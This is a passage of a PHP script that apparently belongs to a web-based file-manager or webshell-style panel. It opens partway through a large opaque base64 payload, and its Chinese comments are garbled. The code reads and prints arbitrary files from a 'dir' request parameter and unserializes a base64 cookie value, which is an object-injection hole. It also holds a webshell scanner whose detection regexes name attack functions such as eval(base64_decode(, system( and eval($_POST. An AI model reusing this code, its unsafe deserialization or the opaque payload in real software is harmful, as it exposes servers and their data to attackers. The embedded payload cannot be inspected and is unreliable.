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");
        }
        die();
    }
//////////////////////////////////////////////////////////////////


//��ȡ��չ��ת����ͼƬ
function Fname($name){
$path_parts = pathinfo("$name");
$name = strtolower($path_parts["extension"]);
if($name=="php"){$name="php";}
elseif($name=="flv"){$name="flv";}
elseif($name=="php3"){$name="php";}
elseif($name=="php4"){$name="php";}
elseif($name=="asp"){$name="php";}
elseif($name=="txt"){$name="txt";}
elseif($name=="xml"){$name="xml";}
elseif($name=="xsl"){$name="xsl";}
elseif($name=="htm"){$name="IExplore";}
elseif($name=="html"){$name="IExplore";}
elseif($name=="zip"){$name="zip";}
elseif($name=="rar"){$name="Winrar";}
elseif($name=="zg"){$name="Winrar";}
elseif($name=="mp3"){$name="wmplayer";}
elseif($name=="wma"){$name="wmplayer";}
elseif($name=="rm"){$name="wmplayer";}
elseif($name=="ram"){$name="wmplayer";}
elseif($name=="ai"){$name="ai";}
elseif($name=="avi"){$name="avi";}
elseif($name=="bmp"){$name="bmp";}
elseif($name=="aif"){$name="aif";}
elseif($name=="aifc"){$name="aif";}
elseif($name=="aiff"){$name="aif";}
elseif($name=="dll"){$name="dll";}
elseif($name=="doc"){$name="doc";}
elseif($name=="exe"){$name="exe";}
elseif($name=="gif"){$name="gif";}
elseif($name=="jpe"){$name="jpe";}
elseif($name=="jpeg"){$name="jpe";}
elseif($name=="jpg"){$name="jpe";}
elseif($name=="js"){$name="js";}
elseif($name=="tar.gz"){$name="Winrar";}
elseif($name=="tar"){$name="Winrar";}
elseif($name=="lha"){$name="Winrar";}
elseif($name=="tgz"){$name="Winrar";}
elseif($name=="lzh"){$name="Winrar";}
elseif($name=="mov"){$name="mov";}
elseif($name=="midi"){$name="midi";}
elseif($name=="mid"){$name="midi";}
elseif($name=="mpeg"){$name="mpeg";}
elseif($name=="mpe"){$name="mpeg";}
elseif($name=="pdf"){$name="pdf";}
elseif($name=="png"){$name="png";}
elseif($name=="mdb"){$name="mdb";}
elseif($name=="rtf"){$name="rtf";}
elseif($name=="so"){$name="so";}
elseif($name=="swf"){$name="swf";}
elseif($name=="tif"){$name="tif";}
elseif($name=="tiff"){$name="tif";}
elseif($name=="wav"){$name="wav";}
elseif($name=="xls"){$name="xls";}
elseif($name=="wbmp"){$name="wbmp";}
elseif($name=="cmd"){$name="cmd";}else{$name="unknown";}
return $name;
}
//--------------------------------------�½��ļ���-----------------------------
function mkdirs($dir, $mode = 0777)  
{  
if (is_dir($dir) || @mkdir($dir, $mode)) return TRUE;  
if (!mkdirs(dirname($dir), $mode)) return FALSE;  
return @mkdir($dir, $mode);  
}

function createDir($aimUrl,$mode = 0777)     //��ͬʱ�����༶Ŀ¼
	        {
	            $aimUrl = str_replace('\\', '/', $aimUrl);
	            $aimDir = '';
	            $arr = explode('/', $aimUrl);
	            foreach ($arr as $str)
	            {
	                $aimDir .= $str . '/';
	                if (!file_exists($aimDir))
	                {
	                    mkdir($aimDir, $mode);
	                }
	            }
	        }
//--------------------------------------php����-----------------------------

function phpjl($dir,$filew){
if($filew==""){
$url=$dir;
}else{
$url=$dir."/".$filew;
}
$fp=fopen($url,"r+");
while(!feof($fp)){
$ss.=fgetc($fp);
}
fclose($fp);

echo $high_str = highlight_string(stripslashes($ss), true);

}
//--------------------------------------phpѹ�������Ķ�-----------------------------
function strip_whitespace($content) {
    $stripStr = '';
    //����phpԴ��
    $tokens = token_get_all($content);
    $last_space = false;
    for ($i = 0, $j = count($tokens); $i < $j; $i++) {
        if (is_string($tokens[$i])) {
            $last_space = false;
            $stripStr .= $tokens[$i];
        } else {
            switch ($tokens[$i][0]) {
                //���˸���PHPע��
                case T_COMMENT:
                case T_DOC_COMMENT:
                    break;
                //���˿ո�
                case T_WHITESPACE:
                    if (!$last_space) {
                        $stripStr .= ' ';
                        $last_space = true;
                    }
                    break;
                case T_END_HEREDOC: //������Ҽ���ȥ�ģ������Heredoc��PHP�ű�
                    $stripStr .= $tokens[$i][1];
                    $stripStr .= $tokens[++$i]."\r\n";
                    break;
                default:
                    $last_space = false;
                    $stripStr .= $tokens[$i][1];
            }
        }
    }
    return $stripStr;
}

/////////////////////////////����ת��////////////////////////////////////
function GetGB2312String($name)
{
$tostr = "";
for($i=0;$i<strlen($name);$i++)
{
   $curbin = ord(substr($name,$i,1));
   if($curbin < 0x80)
   {
    $tostr .= substr($name,$i,1);
   }elseif($curbin < bindec("11000000")){
    $str = substr($name,$i,1);
    $tostr .= "&#".ord($str).";";
   }elseif($curbin < bindec("11100000")){
    $str = substr($name,$i,2);
    $tostr .= "&#".GetUnicodeChar($str).";";
    $i += 1;
   }elseif($curbin < bindec("11110000")){
    $str = substr($name,$i,3);
    $gstr= iconv("UTF-8","GB2312",$str);
    if(!$gstr)
    {
    $tostr .= "&#".GetUnicodeChar($str).";";
    }else{
    $tostr .= $gstr;
    }

    $i += 2;
   }elseif($curbin < bindec("11111000")){
    $str = substr($name,$i,4);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 3;
   }elseif($curbin < bindec("11111100")){
    $str = substr($name,$i,5);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 4;
   }else{
    $str = substr($name,$i,6);
    $tostr .= "&#".GetUnicodeChar($str).";";
   
    $i += 5;
   }
}

return $tostr;
}//end function

function GetUnicodeChar($str)
{
$temp = "";
for($i=0;$i<strlen($str);$i++)
{
   $x = decbin(ord(substr($str,$i,1)));
   if($i == 0)
   {
    $s = strlen($str)+1;
    $temp .= substr($x,$s,8-$s);
   }else{
    $temp .= substr($x,2,6);
   }
}
return bindec($temp);
}//end function//---------------------------------------------------------------


//phpɨ��Σ���ļ�---------------------------------------------------------------
function scan($path = '.',$is_ext){
 global $php_code,$count,$scanned,$list;
    $ignore = array('.', '..' );
    $replace=array(" ","\n","\r","\t");
    $dh = @opendir( $path );

    while(false!==($file=readdir($dh))){
        if( !in_array( $file, $ignore ) ){                 
            if( is_dir( "$path$file" ) ){
                scan("$path$file/",$is_ext);            
            } else {
    $current = $path.$file;
    if(MYFULLPATH==$current) continue;
    if(!preg_match("/$is_ext/i",$file)) continue;
    if(is_readable($current))
    {
     $scanned++;
     $content=file_get_contents($current);
     $content= str_replace($replace,"",$content);
     foreach($php_code as $key => $value)
     {
      if(preg_match("/$value/i",$content))
      {
       $count++;
       $j = $count % 2 + 1;
       $filetime = date('Y-m-d H:i:s',filemtime($current));
       $reason = explode("->",$key);
       $url = "?bj=1&A=6&dir=".$current;
       $kuozhanming=Fname($current);
       preg_match("/$value/i",$content,$arr);
       $list.="
<tr class='alt$j'>
  <td><div class=$kuozhanming></div></td>
  <td><a href='$url' target='_blank'>$current</a></td>
  <td>$filetime</td>
  <td><font color=red>$reason[0]</font></td>
  <td><font color=#090>$reason[1]</font></td>
  <td><a href='?bj=1&A=7&dir=$current' target='_blank'>����</a></td>
</tr>";
       //echo $key . "-" . $path . $file ."(" . $arr[0] . ")" ."<br />"; 
       //echo $path . $file ."<br />";
       break;
      }
     }
    }
            }
        }
    }
    closedir( $dh );
} 
function getSetting()
{
 $Ssetting = array();
 if(isset($_COOKIE['t00ls_s']))
 {
  $Ssetting = unserialize(base64_decode($_COOKIE['t00ls_s']));
  $Ssetting['user']=isset($Ssetting['user'])?$Ssetting['user']:"php | php? | phtml | shtml";
  $Ssetting['all']=isset($Ssetting['all'])?intval($Ssetting['all']):0;
  $Ssetting['hta']=isset($Ssetting['hta'])?intval($Ssetting['hta']):1;
 }
 else
 {
  $Ssetting['user']="php | php? | phtml | shtml";
  $Ssetting['all']=0;
  $Ssetting['hta']=1;
  setcookie("t00ls_s", base64_encode(serialize($Ssetting)), time()+60*60*24*365,"/");
 }
 return $Ssetting;
}
function getCode()
{
 return array(
 '��������->vbscript.encoder'=>'vbscript\.encoder',
 '��������->cmd.exe'=>'cmd\.exe',
 '��������->sethc.exe'=>'sethc\.exe',
 '��������->system32'=>'system32',
 '��������->cha88.cn'=>'cha88\.cn',
 '��������->c99shell'=>'c99shell',
 '��������->phpspy'=>'phpspy',
 '��������->Scanners'=>'Scanners',
 '��������->cmd.php'=>'cmd\.php',
 '��������->str_rot13'=>'str_rot13',
 '��������->webshell'=>'webshell',
 '��������->EgY_SpIdEr'=>'EgY_SpIdEr',
 '��������->tools88.com'=>'tools88\.com',
 '��������->SECFORCE'=>'SECFORCE',
 '��������->eval("?>'=>'eval\((\'|")\?>',
 '���ɴ�������->system('=>'system\(',
 '���ɴ�������->passthru('=>'passthru\(',
 '���ɴ�������->shell_exec('=>'shell_exec\(',
 '���ɴ�������->exec('=>'exec\(',
 '���ɴ�������->popen('=>'popen\(',
 '���ɴ�������->proc_open'=>'proc_open',
 '���ɴ�������->eval($'=>'eval\((\'|"|\s*)\\$',
 '���ɴ�������->assert($'=>'assert\((\'|"|\s*)\\$',
 'Σ��MYSQL����->returns string soname'=>'returnsstringsoname',
 'Σ��MYSQL����->into outfile'=>'intooutfile',
 'Σ��MYSQL����->load_file'=>'select(\s+)(.*)load_file',
 '���ܺ�������->eval(gzinflate('=>'eval\(gzinflate\(',
 '���ܺ�������->eval(base64_decode('=>'eval\(base64_decode\(',
 '���ܺ�������->eval(gzuncompress('=>'eval\(gzuncompress\(',
 '���ܺ�������->eval(gzdecode('=>'eval\(gzdecode\(',
 '���ܺ�������->eval(str_rot13('=>'eval\(str_rot13\(',
 '���ܺ�������->gzuncompress(base64_decode('=>'gzuncompress\(base64_decode\(',
 '���ܺ�������->base64_decode(gzuncompress('=>'base64_decode\(gzuncompress\(',
 'һ�仰��������->eval(file_get_contents'=>'eval\(file_get_contents\(',
 'һ�仰��������->eval($_'=>'eval\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 'һ�仰��������->assert($_'=>'assert\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
